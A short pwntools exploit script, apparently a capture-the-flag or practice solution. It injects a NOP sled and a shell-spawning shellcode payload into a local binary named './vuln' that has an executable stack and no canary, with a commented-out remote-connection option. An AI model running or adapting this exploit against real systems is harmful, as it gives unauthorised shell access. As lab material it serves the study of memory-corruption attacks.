#!/usr/bin/env python3

from pwn import *

exe = './vuln'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#host,port = '',

p = process(exe)
#p = remote(host,port)

padding = 4
shellcode = asm(shellcraft.sh())

payload = flat(
    asm('nop')*padding,
    asm('nop')*16,
    shellcode,
)

p.sendlineafter(b'!',payload)
p.interactive()

'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

    '''
